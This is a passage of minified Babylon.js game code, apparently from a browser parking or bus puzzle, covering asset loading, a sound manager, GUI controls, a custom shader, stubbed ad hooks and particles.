function calculatePixel(a,b,e){var f=new BABYLON.Vector3;e=e.getBoundingInfo().boundingBox.vectorsWorld;b=b.viewport.toGlobal(engine.getRenderWidth(),engine.getRenderHeight());for(var h=1E10,m=1E10,k=-1E10,n=-1E10,v=0;v<e.length;v++)BABYLON.Vector3.ProjectToRef(e[v],BABYLON.Matrix.IdentityReadOnly,a.getTransformMatrix(),b,f),h>f.x&&(h=f.x),k<f.x&&(k=f.x),m>f.y&&(m=f.y),n<f.y&&(n=f.y);return{x:k-h,y:n-m}}
function getUrlParameterByName(a,b){b=b||window.location.href;a=a.replace(/[\[\]]/g,"\\$&");return(a=(new RegExp("[?&]"+a+"(=([^&#]*)|&|#|$)")).exec(b))?a[2]?decodeURIComponent(a[2].replace(/\+/g," ")):"":null};var ADS_ENABLED=!1,ADS_DELAY=15E4,ADS_DEC=2E4,ADS_MINTIME=15E4,ADS_TIME_DEC_ENABLED=!0,ADS_ON_FIRST_PLAY=!1,ADS_MOBILE_WIDTH=480,ADS_MOBILE_HEIGHT=800,adinplay_onAdStarted=function(){},adinplay_onAdFinished=function(){};
function adinplay_init(){}var ads_time=0;
function adinplay_playVideoAd(){adinplay_enableInput();adinplay_onAdStarted();adinplay_onAdFinished()}
var adinplay_rew_callbacks=[];
function adinplay_playRewardedVideo(a,b,e){adinplay_rew_callbacks[0]=a;adinplay_rew_callbacks[1]=b;adinplay_rew_callbacks[2]=e;adinplay_enableInput();"function"===typeof b&&b.call(e)}
function adinplay_rewardedPreload(){}var _buttons_enabled=!0;function adinplay_disableInput(){_buttons_enabled=Buttons.enabled;Buttons.enabled=!1}
function adinplay_enableInput(){Buttons.enabled=_buttons_enabled;activeScene.onGameResume()}function adinplay_pauseMusic(){BABYLON.Engine.audioEngine.setGlobalVolume(0)}function adinplay_resumeMusic(){BABYLON.Engine.audioEngine.setGlobalVolume(1)}function getJsonFromUrl(){for(var a={},b=location.search.substr(1).split("&"),e=0;e<b.length;e++){var f=b[e].indexOf("=");f=[b[e].substring(0,f),b[e].substring(f+1)];a[f[0]]=decodeURIComponent(f[1])}return a};function arrayLineV(a,b,e,f){b=Math.round(b);e=Math.round(e);f=Math.round(f);var h=b<e?b:e;for(b=Math.abs(b-e);0<=b;b--)a.push([f,h+b])}function arrayLineH(a,b,e,f){b=Math.round(b);e=Math.round(e);f=Math.round(f);var h=b<e?b:e;for(b=Math.abs(b-e);0<=b;b--)a.push([h+b,f])}
function arrayLineDDA(a,b,e,f,h){b=Math.round(b);e=Math.round(e);f=Math.round(f);h=Math.round(h);var m=f-b,k=h-e,n;if(0===m)arrayLineV(a,e,h,b);else if(0===k)arrayLineH(a,b,f,e);else if(f=0>m?-1:1,h=0>k?-1:1,m=Math.abs(m),k=Math.abs(k),m>=k){var v=-m;a.push([b,e]);for(n=m;0<n;n--)b+=f,v+=2*k,0<=v&&(e+=h,v-=2*m),a.push([b,e])}else for(v=-k,a.push([b,e]),n=k;0<n;n--)e+=h,v+=2*m,0<=v&&(b+=f,v-=2*k),a.push([b,e])};var VisibilityHandler=function(a){var b;void 0!==document.hidden?b="visibilitychange":["webkit","moz","ms"].forEach(function(f){void 0!==document[f+"Hidden"]&&(document.hidden=function(){return document[f+"Hidden"]},b=f+"visibilitychange")});var e=function(f){if(document.hidden||"pause"===f.type)a.onGameHidden(f);else a.onGameVisible(f)};b&&document.addEventListener(b,e,!1);window.onblur=function(f){a.onGameBlur(f)};window.onfocus=function(f){a.onGameFocus(f)};window.focus&&window.focus()};function customLoadingScreen(){}customLoadingScreen.prototype.displayLoadingUI=function(){};customLoadingScreen.prototype.hideLoadingUI=function(){window.document.getElementById("loadingScreen").style.display="none"};function createSliderControl(a,b,e,f,h,m){var k=new BABYLON.GUI.Rectangle("pnlSlider");k.transformCenterX=.5;k.transformCenterY=.5;k.isPointerBlocker=!0;k.isHitTestVisible=!0;k.clipContent=!1;k.clipChildren=!1;k.thickness=0;k.color="yellow";k.leftInPixels=b;k.topInPixels=e;k._value=0;k._minimum=0;k._maximum=100;k._sliding=!1;k._sliderGap=30;k.onValueChanged=function(n){};a.addControl(k);k.imgSliderBg=new BABYLON.GUI.Image("imgSliderBg");k.imgSliderBg.transformCenterX=.5;k.imgSliderBg.transformCenterY=
.5;k.imgSliderBg.isPointerBlocker=!1;k.imgSliderBg.isHitTestVisible=!1;k.addControl(k.imgSliderBg);SetImageFromSpritesheet(k.imgSliderBg,getAssetImage("pak1"),getAssetImageFrames("pak1"),f);k.imgSliderFill=new BABYLON.GUI.Image("imgSliderFill");k.imgSliderFill.transformCenterX=0;k.imgSliderFill.transformCenterY=.5;k.imgSliderFill.isPointerBlocker=!1;k.imgSliderFill.isHitTestVisible=!1;k.imgSliderFill.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT;k.addControl(k.imgSliderFill);SetImageFromSpritesheet(k.imgSliderFill,
getAssetImage("pak1"),getAssetImageFrames("pak1"),h);k.imgSliderFill.fullWidth=k.imgSliderFill.sourceWidth;k.imgSliderFill.leftInPixels=(k.imgSliderBg.sourceWidth-k.imgSliderFill.sourceWidth)/2+this._sliderGap;k.imgSlider=new BABYLON.GUI.Image("imgSlider");k.imgSlider.transformCenterX=1;k.imgSlider.transformCenterY=.5;k.imgSlider.isPointerBlocker=!1;k.imgSlider.isHitTestVisible=!1;k.imgSlider.alpha=1;k.imgSlider.horizontalAlignment=BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT;k.addControl(k.imgSlider);
SetImageFromSpritesheet(k.imgSlider,getAssetImage("pak1"),getAssetImageFrames("pak1"),m);k.onPointerDownObservable.add(function(n,v){this._sliding=!0;v=v.currentTarget.transformedMeasure;this.value=this._minimum+(n.x-(v.left+this._sliderGap))/(v.width-2*this._sliderGap)*(this._maximum-this._minimum)}.bind(k));k.onPointerMoveObservable.add(function(n,v){this._sliding&&(v=v.currentTarget.transformedMeasure,this.value=this._minimum+(n.x-(v.left+this._sliderGap))/(v.width-2*this._sliderGap)*(this._maximum-
this._minimum))}.bind(k));k.onPointerOutObservable.add(function(n,v){this._sliding&&(this._sliding=!1)}.bind(k));k.onPointerUpObservable.add(function(n,v){this._sliding&&(this._sliding=!1)}.bind(k));k.widthInPixels=k.imgSliderBg.widthInPixels+2*k._sliderGap;k.heightInPixels=k.imgSliderBg.heightInPixels+2*k._sliderGap;Object.defineProperty(k,"value",{get:function(){return this._value},set:function(n){n<this._minimum&&(n=this._minimum);n>this._maximum&&(n=this._maximum);this._value=n;var v=(this._value-
this._minimum)/(this._maximum-this._minimum);this.imgSliderFill.sourceWidth=this.imgSliderFill.fullWidth*v;this.imgSliderFill.widthInPixels=this.imgSliderFill.fullWidth*v;this.imgSlider.leftInPixels=this.imgSliderFill.leftInPixels+this.imgSliderFill.widthInPixels-.5*this._sliderGap+this._sliderGap*v-this.imgSlider.widthInPixels*v;this.onValueChanged(n)},enumerable:!0,configurable:!0});Object.defineProperty(k,"sliderGap",{get:function(){return this._sliderGap},set:function(n){this._sliderGap=n;this.widthInPixels=
this.imgSliderBg.widthInPixels;this.heightInPixels=this.imgSliderBg.heightInPixels;this.imgSliderFill.leftInPixels=(this.imgSliderBg.sourceWidth-this.imgSliderFill.sourceWidth)/2},enumerable:!0,configurable:!0});return k};var FRAME_RATE=60,CommonAnimations={AnimateObjectProperty:function(a,b,e,f,h,m,k,n,v){void 0===h&&(h=null);void 0===m&&(m=1);void 0===k&&(k=!1);void 0===n&&(n=null);var w=new BABYLON.Animation("animateObjectProperty",b,FRAME_RATE,BABYLON.Animation.ANIMATIONTYPE_FLOAT,BABYLON.Animation.ANIMATIONLOOPMODE_CYCLE);w.setKeys([{frame:0,value:fetchFromObject(a,b)},{frame:Math.floor(FRAME_RATE*f/1E3),value:e}]);if(null!=v){b=[];for(e=0;e<v.length;e++)b.push({frame:Math.floor(FRAME_RATE*f/1E3)*v[e][0],value:v[e][1]});
w.setKeys(b)}w.setEasingFunction(null);null!=h&&(h.hasOwnProperty("func")||(h={func:h}),h.hasOwnProperty("mode")||(h.mode=BABYLON.EasingFunction.EASINGMODE_EASEIN),b=v=null,h.hasOwnProperty("p1")&&(v=h.p1),h.hasOwnProperty("p2")&&(b=h.p2),v=new h.func(v,b),v.setEasingMode(h.mode),w.setEasingFunction(v));return activeScene.scene.beginDirectAnimation(a,[w],0,f,k,m,n)}};var Buttons={enabled:!0};function disableButton(a){a.isHitTestVisible=!1;a.isFocusInvisible=!0}function hideControl(a){a.isVisible=!1}function enableButton(a){a.isHitTestVisible=!0;a.isFocusInvisible=!1}function showControl(a){a.isVisible=!0}function GetFrameByName(a,b){for(var e=null,f=0;f<a.length;f++)a[f].filename==b&&(e=a[f],a[f].hasOwnProperty("usage")||(a[f].usage=0),a[f].usage++);return e}function ShowFramesUsage(a){for(var b=0;b<a.length;b++)a[b].hasOwnProperty("usage")}
function ResetGuiButtonAppearance(a,b,e){a.widthInPixels=b;a.heightInPixels=e;a.color="white";a.thickness=0;a.background="transparent"};function ContainerAssetTask(a,b,e,f){BABYLON.AbstractAssetTask.call(this,a);this.name=a;this.meshesNames=b;this.rootUrl=e;this.sceneFilename=f}ContainerAssetTask.prototype=Object.create(BABYLON.AbstractAssetTask.prototype);ContainerAssetTask.prototype.constructor=ContainerAssetTask;
ContainerAssetTask.prototype.runTask=function(a,b,e){var f=this;BABYLON.SceneLoader.LoadAssetContainer(this.rootUrl,this.sceneFilename,a,function(h){f.loadedContainer=h;f.loadedMeshes=h.meshes;f.loadedParticleSystems=h.particleSystems;f.loadedSkeletons=h.skeletons;f.loadedAnimationGroups=h.animationGroups;b()},null,function(h,m,k){e(m,k)})};BABYLON.AssetsManager.prototype.addContainerTask=function(a,b,e,f){a=new ContainerAssetTask(a,b,e,f);this._tasks.push(a);return a};
var AssetLoader=function(a){AssetLoader.instance=this;this.create(a)};AssetLoader.instance=null;
AssetLoader.prototype={create:function(a){this.callback={};this.assetsManager=new BABYLON.AssetsManager(a);this.assetsManager.useDefaultLoadingScreen=!1;this.assetsManager.autoHideLoadingUI=!1;this.assetsManager.addContainerTask=function(b,e,f,h){b=new ContainerAssetTask(b,e,f,h);this._tasks.push(b);return b};this.assetsManager.onProgress=function(b,e,f){onProgress(f.name,Math.round((e-b)/e*100))};this.loadedXMLs=[];this.loadedJSONs=[];this.loadedImages=[];this.loadedTextures=[];this.loadedContainers=
[];this.loadedSounds=[]},prepareAssetsTasks:function(a){for(var b=0;b<a.length;b++){var e=a[b].type;"xml"==e&&(this.assetsManager.addTextFileTask(a[b].file,a[b].root+a[b].file).onSuccess=function(f){var h=new DOMParser;this.loadedXMLs[f.name]=h.parseFromString(f.text,"application/xml")}.bind(this));"json"==e&&(this.assetsManager.addTextFileTask(a[b].file,a[b].root+a[b].file).onSuccess=function(f){this.loadedJSONs[f.name]=JSON.parse(f.text)}.bind(this));"texture"==e&&(this.assetsManager.addTextureTask(a[b].file,
a[b].root+a[b].file).onSuccess=function(f){this.loadedTextures[f.name]=f.texture}.bind(this));"image"==e&&(this.assetsManager.addImageTask(a[b].file,a[b].root+a[b].file).onSuccess=function(f){this.loadedImages[f.name]=f.image}.bind(this));"model"==e&&(this.assetsManager.addContainerTask(a[b].file,"",a[b].root,a[b].file).onSuccess=function(f){f.loadedContainer.rootNodes[0].name=f.name;this.loadedContainers[f.name]=f.loadedContainer;this.loadedContainers[f.name.toLowerCase()]=f.loadedContainer;for(var h=
0;h<this.loadedContainers[f.name].materials.length;h++)this.loadedContainers[f.name].materials[h].metallic=0,this.loadedContainers[f.name].materials[h].ambientColor=new BABYLON.Color3(.4,.4,.4),this.loadedContainers[f.name].materials[h].cullBackFaces=!0,this.loadedContainers[f.name].materials[h].freeze()}.bind(this));"audio"==e&&(this.assetsManager.addBinaryFileTask(a[b].file,a[b].root+a[b].file).onSuccess=function(f){this.loadedSounds[f.name]=new BABYLON.Sound(f.name,f.data,activeScene.scene,function(){this.loadedSounds[f.name].stop()}.bind(this),
{autoplay:!1})}.bind(this));"skybox"==e&&(e=null,a[b].hasOwnProperty("extensions")&&(e=a[b].extensions),this.assetsManager.addCubeTextureTask(a[b].file,a[b].root+a[b].file,e).onSuccess=function(f){}.bind(this))}},loadFonts:function(a){void 0===a&&(a=null);var b=document.createElement("style");b.innerHTML="\n@font-face {\n    font-family: 'gamefont';\n    src: url('assets/fnt/gamefont.ttf') format('truetype');\n    font-weight: normal;\n    font-style: normal;\n}\n"+document.head.appendChild(b);b=
document.createElement("div");b.innerHTML="<span style=\"font-family: 'gamefont', 'Arial Black', sans-serif, normal;\">PRELOAD</span>";document.body.appendChild(b);document.fonts.ready.then(function(){null!=a&&a()})},loadSplashAssets:function(a){this.callback=a;this.prepareAssetsTasks([{root:"assets/dat/",file:"m.isr",type:"xml"},{root:"assets/imgs/",file:"main_bg.jpg",type:"image"},{root:"assets/imgs/",file:"logo_big.png",type:"image"},{root:"assets/imgs/",file:"splash.jpg",type:"image"},{root:"assets/imgs/",
file:"gametitle_en.png",type:"image"},{root:"assets/imgs/",file:"gametitle_ru.png",type:"image"}]);this.assetsManager.onFinish=function(b){this.assetsManager.reset();this.callback()}.bind(this);this.assetsManager.load()},loadGameAssets:function(a){this.callback=a;this.prepareAssetsTasks([{root:"assets/imgs/",file:"pak1.json",type:"json"},{root:"assets/imgs/",file:"pak1.png",type:"image"},{root:"assets/imgs/",file:"expl.json",type:"json"},{root:"assets/imgs/",file:"people.json",type:"json"},{root:"assets/imgs/",
file:"people.png",type:"texture"},{root:"assets/imgs/",file:"digits.json",type:"json"},{root:"assets/imgs/",file:"digits.png",type:"texture"},{root:"assets/imgs/",file:"flare.png",type:"texture"},{root:"assets/imgs/",file:"expl.png",type:"texture"},{root:"assets/models/",file:"parking_field.glb",type:"model"},{root:"assets/models/",file:"entrance.glb",type:"model"},{root:"assets/models/",file:"queue_panel.glb",type:"model"},{root:"assets/models/",file:"car.glb",type:"model"},{root:"assets/models/",
file:"van.glb",type:"model"},{root:"assets/models/",file:"bus.glb",type:"model"},{root:"assets/models/",file:"stand.glb",type:"model"},{root:"assets/imgs/",file:"player.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_red.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_green.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_blue.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_orange.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_teal.png",type:"texture"},
{root:"assets/imgs/buses/",file:"car_purple.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_pink.png",type:"texture"},{root:"assets/imgs/buses/",file:"car_yellow.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_blue.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_green.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_orange.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_pink.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_purple.png",type:"texture"},
{root:"assets/imgs/buses/",file:"bus_red.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_teal.png",type:"texture"},{root:"assets/imgs/buses/",file:"bus_yellow.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_blue.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_green.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_orange.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_pink.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_purple.png",type:"texture"},
{root:"assets/imgs/buses/",file:"van_red.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_teal.png",type:"texture"},{root:"assets/imgs/buses/",file:"van_yellow.png",type:"texture"},{root:"assets/audio/",file:"pop.mp3",type:"audio"},{root:"assets/audio/",file:"completed_1.mp3",type:"audio"},{root:"assets/audio/",file:"completed_2.mp3",type:"audio"},{root:"assets/audio/",file:"completed_3.mp3",type:"audio"},{root:"assets/audio/",file:"vehicle_hit.mp3",type:"audio"},{root:"assets/audio/",file:"car_movement.mp3",
type:"audio"},{root:"assets/audio/",file:"bus_engine.mp3",type:"audio"},{root:"assets/audio/",file:"button.mp3",type:"audio"},{root:"assets/audio/",file:"buy.mp3",type:"audio"},{root:"assets/audio/",file:"coin.mp3",type:"audio"},{root:"assets/audio/",file:"count0.mp3",type:"audio"},{root:"assets/audio/",file:"count321.mp3",type:"audio"},{root:"assets/audio/",file:"lost.mp3",type:"audio"},{root:"assets/audio/",file:"music_ingame.mp3",type:"audio"},{root:"assets/audio/",file:"music_menu.mp3",type:"audio"},
{root:"assets/audio/",file:"negative_buy.mp3",type:"audio"},{root:"assets/audio/",file:"spending.mp3",type:"audio"},{root:"assets/audio/",file:"lost.mp3",type:"audio"},{root:"assets/audio/",file:"won.mp3",type:"audio"}]);this.assetsManager.onFinish=function(b){this.assetsManager.reset();this.callback()}.bind(this);this.assetsManager.load()},instantiateModel:function(a,b){void 0===b&&(b=null);a=this.loadedContainers[a].instantiateModelsToScene(function(e){return e},!1);null!=b&&traverseSetAttrib(a.rootNodes[0],
"layerMask",b);return a}};function getAssetImage(a){var b=a+".png";AssetLoader.instance.loadedImages.hasOwnProperty(b)||console.error("getAssetImage( "+a+") : image not found");return AssetLoader.instance.loadedImages[b]}function getAssetImageFrames(a){var b=a+".json";AssetLoader.instance.loadedJSONs.hasOwnProperty(b)||console.error("getAssetImageFrames( "+a+") : json not found");return AssetLoader.instance.loadedJSONs[b].frames};SoundManager=function(a){SoundManager.instance=this;this.scene=a;try{this.musicVolume=this.soundVolume=1,localStorage.getItem(GameData.ProfileName+"-sounds")&&(this.soundVolume=localStorage.getItem(GameData.ProfileName+"-sounds")),localStorage.getItem(GameData.ProfileName+"-music")&&(this.musicVolume=localStorage.getItem(GameData.ProfileName+"-music"))}catch(b){this.musicVolume=this.soundVolume=1}this.music=[];this.sounds=[];this.prevSoundPlayed=this.actualMusic=null;this.create()};
SoundManager.instance=null;
SoundManager.prototype={constructor:SoundManager,create:function(){this.addSound("completed_1",.3);this.addSound("completed_2",.3);this.addSound("completed_3",.3);this.addSound("vehicle_hit",.3);this.addSound("car_movement",.6);this.addSound("bus_engine",.3);this.addSound("pop",.3);this.addSound("button",.1);this.addSound("buy",.6);this.addSound("coin",.7);this.addSound("count0",.5);this.addSound("count321",.5);this.addSound("lost",.6);this.addMusic("music_ingame",.5,!0);this.addMusic("music_menu",
.8,!0);this.addSound("negative_buy",1);this.addSound("lost",.9);this.addSound("won",.9);this.addSound("spending",.4)},addMusic:function(a,b,e){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);void 0===e&&(e=!1);this.music[a]=AssetLoader.instance.loadedSounds[a];this.music[a].loop=e;this.music[a].VOLUME=b;this.music[a].setVolume(this.music[a].VOLUME*this.musicVolume)},addSound:function(a,b,e){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);void 0===e&&(e=!1);this.sounds[a]=
AssetLoader.instance.loadedSounds[a];this.sounds[a].loop=e;this.sounds[a].VOLUME=b;this.sounds[a].setVolume(this.sounds[a].VOLUME*this.soundVolume)},playMusic:function(a,b){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);void 0===b&&(b=!1);if(a!=this.actualMusic||b)this.actualMusic=a;for(var e in this.music)if("contains"!=e&&"remove"!=e)if(e==this.actualMusic){if(this.music[e].isPlaying&&!b)break;this.music[e].play()}else this.music[e].stop()},playSound:function(a,b,e){0>a.indexOf(activeScene.audioType)&&
(a+="."+activeScene.audioType);void 0===b&&(b=null);void 0===e&&(e=null);try{this.sounds[a].setVolume(this.sounds[a].VOLUME*this.soundVolume),null!=b&&this.sounds[a].setVolume(b*this.soundVolume),null!=e&&this.sounds[a].setPlaybackRate(e),this.sounds[a].play()}catch(f){console.error("[SoundManager] Failed to play sound : "+a)}},soundIsPlaying:function(a){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);return this.sounds[a].isPlaying},stopSound:function(a){0>a.indexOf(activeScene.audioType)&&
(a+="."+activeScene.audioType);try{this.sounds[a].stop()}catch(b){console.error("[SoundManager] Failed to stop sound : "+a)}},pauseMusic:function(a){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);try{this.music[a].isPlaying&&this.music[a].pause()}catch(b){console.error("[SoundManager] Failed to pause music : "+a)}},pauseAllMusic:function(){for(var a in this.music)"contains"!=a&&"remove"!=a&&a==this.actualMusic&&this.pauseMusic(a)},resumeMusic:function(a){0>a.indexOf(activeScene.audioType)&&
(a+="."+activeScene.audioType);try{this.music[a].isPaused&&this.music[a].play()}catch(b){console.error("[SoundManager] Failed to resume music : "+a)}},resumeAllMusic:function(){for(var a in this.music)"contains"!=a&&"remove"!=a&&a==this.actualMusic&&this.resumeMusic(a)},pauseSound:function(a){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);this.sounds[a].isPlaying&&this.sounds[a].pause()},pauseAllSounds:function(){for(var a in this.sounds)"contains"!=a&&"remove"!=a&&this.pauseSound(a)},
resumeSound:function(a){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);this.sounds[a].isPaused&&this.sounds[a].play()},resumeAllSounds:function(){for(var a in this.sounds)"contains"!=a&&"remove"!=a&&this.resumeSound(a)},stopMusic:function(a){0>a.indexOf(activeScene.audioType)&&(a+="."+activeScene.audioType);try{this.music[a].stop()}catch(b){console.error("[SoundManager] Failed to stop music : "+a)}},stopAllMusic:function(){for(var a in this.music)"contains"!=a&&"remove"!=a&&this.stopMusic(a)},
setMusicVolume:function(a){this.musicVolume=a;localStorage.setItem(GameData.ProfileName+"-music",this.musicVolume);for(var b in this.music)"contains"!=b&&"remove"!=b&&this.music[b].setVolume(this.music[b].VOLUME*this.musicVolume)},setSoundsVolume:function(a){this.soundVolume=a;localStorage.setItem(GameData.ProfileName+"-sounds",this.soundVolume);for(var b in this.sounds)"contains"!=b&&"remove"!=b&&this.sounds[b].setVolume(this.sounds[b].VOLUME*this.soundVolume)}};var explosionSounds="single_hit_1 single_hit_2 single_hit_3 single_hit_4 single_hit_5 single_hit_6 single_hit_7 single_hit_8 single_hit_9 single_hit_10".split(" ");
function playPinCollisionSound(){for(var a=[],b=0;b<explosionSounds.length;b++)SoundManager.instance.soundIsPlaying(explosionSounds[b])||a.push(explosionSounds[b]);0!=a.length&&(shuffleArray(a),SoundManager.instance.playSound(a[0]))};function fullscreenAvail(){return!1}function fullscreenActive(){return screenfull.isFullscreen}function fullscreenToggle(){screenfull.toggle()};var __extends=this&&this.__extends||function(){var a=function(b,e){a=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(f,h){f.__proto__=h}||function(f,h){for(var m in h)h.hasOwnProperty(m)&&(f[m]=h[m])};return a(b,e)};return function(b,e){function f(){this.constructor=b}a(b,e);b.prototype=null===e?Object.create(e):(f.prototype=e.prototype,new f)}}();BABYLON.Effect.ShadersStore.guiTextureImageFragmentShader="\nprecision highp float;\n\n// Samplers\nvarying vec2 vUV;\nuniform sampler2D textureSampler;\nuniform sampler2D customTextureSampler;\n\n// Parameters\nuniform vec2 bottomLeft, topRight;\nuniform float width, height;\nuniform vec4 backgroundColor;\n\nvec3 mask = normalize(vec3(0.2, 0.4, 0.8));\n\nfloat insideBox(vec2 v) {\n    vec2 s = step(bottomLeft, v) - step(topRight, v);\n    return s.x * s.y;   \n}\n\nvoid main(void) \n{\n    float x = (vUV.x - bottomLeft.x) / width;\n    float y = (vUV.y - topRight.y) / height;\n\n    vec4 orgPixel = texture2D(textureSampler, vUV);\n    if(dot(normalize(orgPixel.xyz * insideBox(vUV)), mask) > 0.99){\n        vec4 pixel = texture2D(customTextureSampler, vec2(x, y));\n        gl_FragColor = pixel + backgroundColor * (1.0 - pixel.w);\n    } else {\n        gl_FragColor = orgPixel;\n    }\n}\n";
var TextureImage=function(a){function b(e){var f=a.call(this)||this;f.texture=e;f.mask="#3366CC";f.uniformsDirty=!1;f.onBeforeDrawObservable.addOnce(function(){f._scene=f.host.getScene();f.addPostProcess();f.onBeforeRenderObserver=f._scene.onBeforeRenderObservable.add(function(){f.uniformsDirty&&f.applyUniforms()});f.onDirtyObservable.add(function(){f.uniformsDirty=!0})});return f}__extends(b,a);b.prototype._draw=function(e){e.fillStyle=this.mask;e.fillRect(this._currentMeasure.left,this._currentMeasure.top,
this._currentMeasure.width,this._currentMeasure.height)};b.prototype.addPostProcess=function(){var e=this;this.postProcess=new BABYLON.PostProcess("guiTexturePostProcess","guiTextureImage","screenSize bottomLeft topRight width height backgroundColor".split(" "),["customTextureSampler"],1,this._scene.activeCamera);this.postProcess.onApply=function(f){e.applyUniforms()}};b.prototype.applyUniforms=function(){var e=this.postProcess.getEffect();if(e){var f=this.host.getSize(),h=f.width;f=f.height;e.setTexture("customTextureSampler",
this.texture);e.setFloat2("bottomLeft",this._currentMeasure.left/h,1-(this._currentMeasure.top+this._currentMeasure.height)/f);e.setFloat2("topRight",(this._currentMeasure.left+this._currentMeasure.width)/h,1-this._currentMeasure.top/f);e.setFloat("width",this.widthInPixels/h);e.setFloat("height",this.heightInPixels/f);e.setVector4("backgroundColor",b.ColorFromString(this.color))}};b.GetContext=function(){if(!b.CTX){var e=document.createElement("canvas");e.width=1;e.height=1;b.CTX=e.getContext("2d")}return b.CTX};
b.ColorFromString=function(e){var f=b.GetContext();f.fillStyle=e;f.fillRect(0,0,1,1);e=f.getImageData(0,0,1,1).data;return(new BABYLON.Vector4(e[0],e[1],e[2],e[3])).scale(1/255)};b.prototype.dispose=function(){this._scene.onBeforeRenderObservable.remove(this.onBeforeRenderObserver);a.prototype.dispose.call(this)};return b}(BABYLON.GUI.Control);BABYLON.GUI.TextureImage=TextureImage;__extends=this&&this.__extends||function(){var a=function(b,e){a=Object.setPrototypeOf||{__proto__:[]}instanceof Array&&function(f,h){f.__proto__=h}||function(f,h){for(var m in h)Object.prototype.hasOwnProperty.call(h,m)&&(f[m]=h[m])};return a(b,e)};return function(b,e){function f(){this.constructor=b}a(b,e);b.prototype=null===e?Object.create(e):(f.prototype=e.prototype,new f)}}();
var MixedTextBlock=function(a){function b(){return null!==a&&a.apply(this,arguments)||this}__extends(b,a);Object.defineProperty(b.prototype,"multiTextArgs",{set:function(e){this._multiTextArgs=e},enumerable:!1,configurable:!0});b.prototype._drawText=function(e,f,h,m){var k=this._currentMeasure.width,n=0;switch(this._textHorizontalAlignment){case BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_LEFT:n=10;break;case BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_RIGHT:n=k-f;break;case BABYLON.GUI.Control.HORIZONTAL_ALIGNMENT_CENTER:n=
(k-f)/2}if(this.shadowBlur||this.shadowOffsetX||this.shadowOffsetY)m.shadowColor=this.shadowColor,m.shadowBlur=this.shadowBlur,m.shadowOffsetX=this.shadowOffsetX,m.shadowOffsetY=this.shadowOffsetY;this.outlineWidth&&m.strokeText(e,this._currentMeasure.left+n,h);e=h-this._fontOffset.height;try{e+=parseInt(this._multiTextArgs[0].font.split(" ")[1].replace("px",""))}catch(v){e=this._fontOffset.height}this._fillMixedText(m,this._multiTextArgs,this._currentMeasure.left+n,e)};b.prototype._fillMixedText=
function(e,f,h,m){var k=e.fillStyle,n=e.font,v=this._fontOffset.height,w=h,r=this._currentMeasure.width-30;e.save();f.forEach(function(y){var z=y.fillStyle,L=y.font,Q=y.text.split(" "),R=0;try{R=parseInt(y.font.split(" ")[1].replace("px",""))}catch(x){R=v}e.fillStyle=z||k;e.font=L||n;Q.forEach(function(x){var S=x.split("\n");if(1<S.length)for(x=0;x<S.length;x++)S[x]=" "+S[x],h-w+e.measureText(S[x]).width>r&&(h=w,m+=R,S[x]=S[x].replace(" ","")),h==w&&(S[x]=S[x].replace(" ","")),e.fillText(S[x],h,m),
h+=e.measureText(S[x]).width,x!=S.length-1&&(m+=R,h=w);else x=" "+x,h-w+e.measureText(x).width>r&&(h=w,m+=R,x=x.replace(" ","")),h==w&&(x=x.replace(" ","")),e.fillText(x,h,m),h+=e.measureText(x).width})});e.restore()};return b}(BABYLON.GUI.TextBlock);Particles=function(a){this.MAX_PARTICLES=100;this.objParticles=[];this._init(a);Particles.instance=this};Particles.instance=null;
Particles.prototype={constructor:Particles,_init:function(a){this.guiParent=a;a={tag:"",velX:0,velY:0,accX:0,accY:0,texturePackImage:"pak1.png",texturePackData:"pak1.json",frameName:"void.png"};for(var b=0;b<this.MAX_PARTICLES;b++)this.CreateParticle(0,0,a);for(b=0;b<this.MAX_PARTICLES;b++)this.objParticles[b].sprite.isVisible=!1},CreateParticle:function(a,b,e){e.hasOwnProperty("tag")||(e.tag="");e.hasOwnProperty("frame")||(e.frame=0);e.hasOwnProperty("life")||(e.life=500+getRandomUInt(200));e.hasOwnProperty("callback")||
(e.callback=null);e.hasOwnProperty("velX")||(e.velX=0);e.hasOwnProperty("velY")||(e.velY=0);e.hasOwnProperty("accX")||(e.accX=0);e.hasOwnProperty("accY")||(e.accY=0);e.hasOwnProperty("rotation")||(e.rotation=0);e.hasOwnProperty("angle")||(e.angle=0);e.hasOwnProperty("scale")?(e.scale.hasOwnProperty("start")||(e.scale.start=1),e.scale.hasOwnProperty("end")||(e.scale.end=e.scale.start)):e.scale={start:1,end:1};e.scale.delta=e.scale.start-e.scale.end;e.hasOwnProperty("scaleX")&&(e.scaleX.hasOwnProperty("start")||
